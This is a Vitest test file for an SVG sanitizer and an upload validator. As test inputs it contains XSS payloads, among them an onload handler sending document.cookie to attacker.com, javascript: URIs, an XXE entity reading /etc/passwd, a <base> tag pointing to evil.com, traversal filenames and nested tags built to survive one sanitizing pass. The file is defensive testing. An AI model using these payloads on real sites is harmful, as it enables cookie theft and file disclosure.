import { describe, it, expect } from 'vitest';
import { sanitizeSvg, validateUploadedAsset } from '../src/sanitizer.js';

describe('SVG Sanitization Engine', () => {
  it('allows safe, valid SVG vector graphics', () => {
    const validSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
      <circle cx="50" cy="50" r="40" fill="#FF5733" />
      <path d="M10 10 L90 90" stroke="#333333" stroke-width="2" />
    </svg>`;

    const res = sanitizeSvg(validSvg);
    expect(res.ok).toBe(true);
    expect(res.violations).toHaveLength(0);
    expect(res.sanitized).toContain('<circle cx="50" cy="50" r="40" fill="#FF5733" />');
  });

  it('strips dangerous inline <script> tags', () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <script type="text/javascript">alert('XSS-EXPLOIT');</script>
      <rect width="100" height="100" fill="#000" />
    </svg>`;

    const res = sanitizeSvg(maliciousSvg);
    expect(res.violations).toContain('Blocked executable <script> element');
    expect(res.sanitized).not.toContain('<script');
    expect(res.sanitized).not.toContain("alert('XSS-EXPLOIT')");
    expect(res.sanitized).toContain('<rect width="100" height="100" fill="#000" />');
  });

  it('strips inline event handlers (onload, onerror, onclick, etc.)', () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?c='+document.cookie)" viewBox="0 0 100 100">
      <circle cx="50" cy="50" r="40" onclick="alert(1)" onerror="eval(atob('malicious'))" />
    </svg>`;

    const res = sanitizeSvg(maliciousSvg);
    expect(res.violations).toContain('Stripped inline event handler attributes (XSS prevention)');
    expect(res.sanitized).not.toContain('onload=');
    expect(res.sanitized).not.toContain('onclick=');
    expect(res.sanitized).not.toContain('onerror=');
    expect(res.sanitized).not.toContain('attacker.com');
  });

  it('blocks dangerous URI schemes in href and xlink:href', () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
      <a href="javascript:alert(document.domain)">
        <text x="10" y="20">Click Me</text>
      </a>
      <image xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" width="50" height="50" />
    </svg>`;

    const res = sanitizeSvg(maliciousSvg);
    expect(res.violations).toContain('Blocked malicious URI scheme (javascript/data:html)');
    expect(res.sanitized).not.toContain('javascript:alert');
    expect(res.sanitized).not.toContain('data:text/html');
    expect(res.sanitized).toContain('href="#blocked"');
  });

  it('neutralizes XML External Entity (XXE) and DTD expansions', () => {
    const xxeSvg = `<?xml version="1.0"?>
    <!DOCTYPE svg [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <svg xmlns="http://www.w3.org/2000/svg">
      <text>&xxe;</text>
    </svg>`;

    const res = sanitizeSvg(xxeSvg);
    expect(res.violations.some((v) => v.includes('XXE'))).toBe(true);
    expect(res.sanitized).not.toContain('<!DOCTYPE');
    expect(res.sanitized).not.toContain('<!ENTITY');
  });

  it('strips dangerous <foreignObject>, <iframe>, and <embed> containers', () => {
    const embedSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="100" height="100">
        <body xmlns="http://www.w3.org/1999/xhtml">
          <input type="password" name="steal" />
          <iframe src="https://phishing.site"></iframe>
        </body>
      </foreignObject>
    </svg>`;

    const res = sanitizeSvg(embedSvg);
    expect(res.violations.some((v) => v.includes('foreignobject'))).toBe(true);
    expect(res.sanitized).not.toContain('foreignObject');
    expect(res.sanitized).not.toContain('iframe');
    expect(res.sanitized).not.toContain('phishing.site');
  });

  it('neutralizes slash-separated event handlers without whitespace (<svg/onload=...>)', () => {
    const maliciousSvg = '<svg/onload=alert(1)><circle/onload=steal() /></svg>';
    const res = sanitizeSvg(maliciousSvg);
    expect(res.violations.some((v) => v.includes('inline event handler'))).toBe(true);
    expect(res.sanitized).not.toContain('onload');
    expect(res.sanitized).not.toContain('alert');
  });

  it('neutralizes unquoted javascript: schemes in href attributes', () => {
    const maliciousSvg = '<svg><a href=javascript:alert(1)><text>click</text></a></svg>';
    const res = sanitizeSvg(maliciousSvg);
    expect(res.violations.some((v) => v.includes('malicious URI scheme'))).toBe(true);
    expect(res.sanitized).not.toContain('javascript:alert');
    expect(res.sanitized).toContain('href="#blocked"');
  });

  it('strips malicious CSS directives from inline style attributes', () => {
    const maliciousSvg = '<svg><circle style="background:url(javascript:alert(1))" /><rect style="behavior:url(test); expression(alert(2))" /></svg>';
    const res = sanitizeSvg(maliciousSvg);
    expect(res.violations.some((v) => v.includes('malicious CSS directive from style'))).toBe(true);
    expect(res.sanitized).not.toContain('javascript:');
    expect(res.sanitized).not.toContain('expression');
  });

  it('blocks dangerous <base> elements and attribute animation tags', () => {
    const maliciousSvg = '<svg><base href="http://evil.com/" /><set attributeName="href" to="javascript:alert(1)" /></svg>';
    const res = sanitizeSvg(maliciousSvg);
    expect(res.violations.some((v) => v.includes('<base>'))).toBe(true);
    expect(res.violations.some((v) => v.includes('attribute animation'))).toBe(true);
    expect(res.sanitized).not.toContain('<base');
    expect(res.sanitized).not.toContain('<set');
  });
});

describe('Asset Upload Validation & Security Engine', () => {
  it('accepts valid raster image and vector assets with SHA256 integrity', () => {
    const pngMagicBytes = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
    const res = validateUploadedAsset({
      filename: 'brand_logo_main.png',
      mimeType: 'image/png',
      sizeBytes: pngMagicBytes.byteLength,
      content: pngMagicBytes,
    });

    expect(res.ok).toBe(true);
    expect(res.violations).toHaveLength(0);
    expect(res.sha256).toBeDefined();
    expect(res.mimeType).toBe('image/png');
  });

  it('rejects forbidden executable, script, and archive file extensions', () => {
    const forbidden = ['exploit.exe', 'payload.sh', 'archive.zip', 'index.html', 'server.js', 'script.php'];

    for (const filename of forbidden) {
      const res = validateUploadedAsset({
        filename,
        mimeType: 'application/octet-stream',
        sizeBytes: 500,
      });
      expect(res.ok).toBe(false);
      expect(res.violations.some((v) => v.includes('prohibited') || v.includes('MIME'))).toBe(true);
    }
  });

  it('blocks directory traversal attempts in filenames', () => {
    const traversalFilenames = ['../../etc/passwd', '..\\windows\\system32', 'uploads/nested.png'];

    for (const filename of traversalFilenames) {
      const res = validateUploadedAsset({
        filename,
        mimeType: 'image/png',
        sizeBytes: 100,
      });
      expect(res.ok).toBe(false);
      expect(res.violations.some((v) => v.includes('directory traversal'))).toBe(true);
    }
  });

  it('detects MIME spoofing when PNG magic bytes do not match', () => {
    const fakePng = new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]); // GIF header instead of PNG
    const res = validateUploadedAsset({
      filename: 'fake_logo.png',
      mimeType: 'image/png',
      sizeBytes: 6,
      content: fakePng,
    });

    expect(res.ok).toBe(false);
    expect(res.violations).toContain('PNG header magic bytes mismatch (possible MIME spoofing)');
  });

  it('enforces maximum upload size ceiling', () => {
    const res = validateUploadedAsset({
      filename: 'huge_file.png',
      mimeType: 'image/png',
      sizeBytes: 15 * 1024 * 1024, // 15MB > 10MB limit
    });

    expect(res.ok).toBe(false);
    expect(res.violations.some((v) => v.includes('exceeds maximum permitted'))).toBe(true);
  });

  it('proves SVG Buffer and Uint8Array payloads are properly sanitized rather than bypassed', () => {
    const svgBuffer = Buffer.from('<svg><script>alert(1)</script><circle cx="10" cy="10" r="5"/></svg>');
    const res = validateUploadedAsset({
      filename: 'vector.svg',
      mimeType: 'image/svg+xml',
      sizeBytes: svgBuffer.length,
      content: svgBuffer,
    });

    expect(res.ok).toBe(true);
    expect(res.sanitizedContent).toBeDefined();
    expect(res.sanitizedContent).not.toContain('<script');
  });

  it('leaves no script behind an input built to survive one pass (audit 2026-09-27 #11)', () => {
    for (const attack of [
      '<svg><scr<script/>ipt>alert(1)</scr<script/>ipt></svg>',
      '<svg><scr<script></script>ipt>alert(1)</script></svg>',
      '<svg><ifr<iframe/>ame src="x"></iframe></svg>',
      '<svg><a hr<script/>ef="javascript:alert(1)">x</a></svg>',
    ]) {
      const res = sanitizeSvg(attack);
      expect(res.sanitized ?? '', attack).not.toMatch(/<script|<iframe|javascript:/i);
    }
    const res = sanitizeSvg('<svg><scr<script/>ipt>alert(1)</scr<script/>ipt></svg>');
    expect(res.violations).toContain('Blocked executable <script> element');
  });
});
